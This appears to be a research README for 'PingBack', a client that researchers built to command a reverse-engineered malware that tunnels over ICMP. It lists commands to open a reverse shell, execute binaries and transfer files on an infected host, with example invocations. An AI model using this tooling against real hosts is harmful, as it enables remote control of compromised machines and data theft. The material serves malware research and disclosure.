# PingBack

This is a client for a malware that we found and reversed engineered that uses ICMP tunneling techniques to evade detection.
The VirusTotal report for this malware can be found here: https://www.virustotal.com/gui/file/e50943d9f361830502dcfdb00971cbee76877aa73665245427d817047523667f/detection

## Installation

### Linux

Currently only tested on Linux, as scapy sniffer didn't work correctly on Windows for us.

`pip3 install -r requirements.txt`

## Usage

```
Usage: pingback.py [OPTIONS] COMMAND [ARGS]...

Options:
  --help  Show this message and exit.

Commands:
  download   Downloads file from remote using mode 1.
  download3  Downloads file from remote using mode 3.
  exep       Execute binary on remote host
  shell      Run shell on remote host, this will tell the remote to connect...
  upload2    Uploads a file to the remote host using mode 2.
```

## Simple Usage Examples

This requires obviously a target running the malware. e.g. if malware was running on 192.168.176.131 to run a shell on the target:

`$ python3 pingback.py --host 192.168.176.131`

This will listen on a random port on the local machine, send an icmp message to the target host with instructions to connect back to the local machine and random port, and establish a shell.

`$ python3 pingback.py download --host 192.168.176.131 --remote_file c:\\windows\\system32\\win32calc.exe --local_file calc.exe`

## Demo

A demo has been made by my colleague @drole
[here](https://www.youtube.com/watch?v=OlzgEVk3dig)


## Authors and acknowledgement

Lloyd Macrohon <jl.macrohon@gmail.com>
Rodel Mendrez <rmendrez@trustwave.com>
